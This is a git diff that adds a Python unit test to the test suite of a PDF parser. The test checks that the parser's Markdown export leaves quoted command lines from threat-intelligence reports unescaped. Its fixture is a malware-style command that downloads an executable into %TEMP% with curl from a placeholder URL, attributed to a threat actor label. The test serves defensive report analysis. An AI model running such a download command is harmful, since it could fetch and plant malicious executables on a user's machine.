@@ -488,6 +488,37 @@ class TestDoclingParser:
         assert parser._converters.get(True) is None
 
 
+class TestDoclingExport:
+    """The Markdown export must not escape the text it hands to the models."""
+
+    @patch("docling.document_converter.DocumentConverter")
+    def test_export_runs_with_both_escape_flags_off(self, mock_converter_cls, tmp_path):
+        """docling-core's defaults (escape_html=True, escape_underscores=True)
+        turned `&&` into `&amp;&amp;`, `<exeUrl>` into `&lt;exeUrl&gt;` and
+        `UNK_X` into `UNK\\_X` in prose and table cells. The entity prompt
+        demands command lines VERBATIM and forbids normalizing, so every
+        escaped command line was dropped, and the AI reviewer proposed them
+        back decoded. The text is consumed by models and byte-matched for
+        source_span; it is never rendered as Markdown."""
+        from app.nodes.deterministic.parsers.docling_parser import DoclingParser
+
+        pdf_file = tmp_path / "report.pdf"
+        pdf_file.write_bytes(b"%PDF-1.4 fake")
+        mock_result = _mock_docling_result(
+            'curl -sS -o "%TEMP%\\msgbox.exe" \'<exeUrl>\' && run by UNK_DoubleCheck'
+        )
+        mock_converter_cls.return_value.convert.return_value = mock_result
+
+        result = DoclingParser().parse(str(pdf_file))
+
+        mock_result.document.export_to_markdown.assert_called_once_with(
+            escape_html=False, escape_underscores=False,
+        )
+        assert "&&" in result.text
+        assert "<exeUrl>" in result.text
+        assert "UNK_DoubleCheck" in result.text
+
+
 class TestParserHygiene:
     """Ligature expansion and tracking-watermark stripping.
 
